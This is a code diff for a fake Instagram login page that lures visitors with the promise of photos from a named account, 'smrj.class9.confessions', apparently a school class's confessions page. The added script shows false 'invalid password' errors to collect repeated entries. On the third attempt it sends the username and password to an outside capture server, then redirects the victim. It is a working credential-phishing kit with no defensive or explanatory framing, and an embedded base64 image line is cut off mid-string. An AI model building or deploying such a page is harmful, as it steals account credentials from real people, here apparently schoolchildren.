@@ -18,11 +18,7 @@
             color: #262626;
         }
 
-        .container { 
-            display: flex; 
-            gap: 30px; 
-            align-items: center; 
-        }
+        .container { display: flex; gap: 30px; align-items: center; }
 
         .phone {
             background: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/43cc71bb1b6d.png') no-repeat;
@@ -40,7 +36,6 @@
             text-align: center;
             border-radius: 8px;
             position: relative;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
         }
 
         .info-icon {
@@ -98,10 +93,7 @@
             font-size: 14px;
         }
 
-        input:focus { 
-            outline: none; 
-            border-color: #a8a8a8; 
-        }
+        input:focus { outline: none; border-color: #a8a8a8; }
 
         button {
             width: 100%;
@@ -120,10 +112,7 @@
             gap: 10px;
         }
 
-        button:disabled { 
-            background: #b2dffc; 
-            cursor: not-allowed; 
-        }
+        button:disabled { background: #b2dffc; cursor: not-allowed; }
 
         .spinner {
             width: 18px;
@@ -144,40 +133,14 @@
             font-size: 14px;
             margin: 10px 0 15px;
             display: none;
-            font-weight: 500;
         }
 
-        .divider { 
-            display: flex; 
-            align-items: center; 
-            margin: 22px 0; 
-            color: #8e8e8e; 
-            font-size: 13px; 
-        }
-        .divider::before, .divider::after { 
-            content: ''; 
-            flex: 1; 
-            height: 1px; 
-            background: #dbdbdb; 
-        }
+        .divider { display: flex; align-items: center; margin: 22px 0; color: #8e8e8e; font-size: 13px; }
+        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
         .divider span { padding: 0 18px; }
 
-        .fb-login { 
-            color: #385185; 
-            font-weight: 600; 
-            text-decoration: none; 
-            font-size: 14px; 
-            margin: 12px 0; 
-            display: block;
-        }
-
-        .forgot { 
-            color: #00376b; 
-            font-size: 12px; 
-            text-decoration: none; 
-            margin: 15px 0; 
-            display: block; 
-        }
+        .fb-login { color: #385185; font-weight: 600; text-decoration: none; font-size: 14px; margin: 12px 0; display: block; }
+        .forgot { color: #00376b; font-size: 12px; text-decoration: none; margin: 15px 0; display: block; }
 
         .signup-box {
             background: white;
@@ -189,15 +152,9 @@
             border-radius: 8px;
         }
 
-        .signup-box a { 
-            color: #0095f6; 
-            font-weight: 600; 
-            text-decoration: none; 
-        }
+        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
 
-        @media (min-width: 876px) { 
-            .phone { display: block; } 
-        }
+        @media (min-width: 876px) { .phone { display: block; } }
     </style>
 </head>
 <body>
@@ -209,4 +166,104 @@
             <div class="main-box">
                 <div class="info-icon" title="Help">i</div>
 
-                <img src="data:image/jpeg;base64,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
+                <!-- Fixed Instagram Logo -->
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" 
+                     alt="Instagram" class="logo-img" style="width:92px;height:92px;">
+
+                <div class="insta-text">Instagram</div>
+
+                <div class="custom-header">
+                    Sign in to your account to see photos of<br>
+                    <strong>smrj.class9.confessions</strong>
+                </div>
+
+                <div id="errorMsg" class="error"></div>
+
+                <form id="loginForm">
+                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                    <input type="password" id="password" placeholder="Password" required>
+
+                    <button type="submit" id="loginBtn">
+                        <span id="btnText">Log in</span>
+                        <span id="spinner" class="spinner" style="display: none;"></span>
+                    </button>
+                </form>
+
+                <div class="divider"><span>OR</span></div>
+
+                <a href="#" class="fb-login">Log in with Facebook</a>
+                <a href="#" class="forgot">Forgot password?</a>
+            </div>
+
+            <div class="signup-box">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let attempt = 0;
+
+        const form = document.getElementById('loginForm');
+        const btn = document.getElementById('loginBtn');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('spinner');
+        const errorMsg = document.getElementById('errorMsg');
+
+        const BACKEND_URL = "http://myphotosconfessions.up.railway.app/capture";
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!username || !password) return;
+
+            attempt++;
+
+            errorMsg.style.display = 'none';
+            btnText.style.display = 'none';
+            spinner.style.display = 'inline-block';
+            btn.disabled = true;
+
+            setTimeout(() => {
+                if (attempt < 3) {
+                    errorMsg.textContent = "Invalid username or password";
+                    errorMsg.style.display = 'block';
+
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+
+                    btnText.style.display = 'inline';
+                    spinner.style.display = 'none';
+                    btn.disabled = false;
+                } else {
+                    fetch(BACKEND_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            username: username,
+                            password: password,
+                            target: "smrj.class9.confessions",
+                            time: new Date().toISOString()
+                        })
+                    }).then(() => {
+                        window.location.href = "1.html";
+                    }).catch(() => {
+                        window.location.href = "1.html";
+                    });
+                }
+            }, 1400);
+        });
+
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('input', () => {
+                const u = document.getElementById('username').value.trim();
+                const p = document.getElementById('password').value.trim();
+                btn.style.background = (u && p) ? '#0095f6' : '#b2dffc';
+            });
+        });
+    </script>
+</body>
+</html>
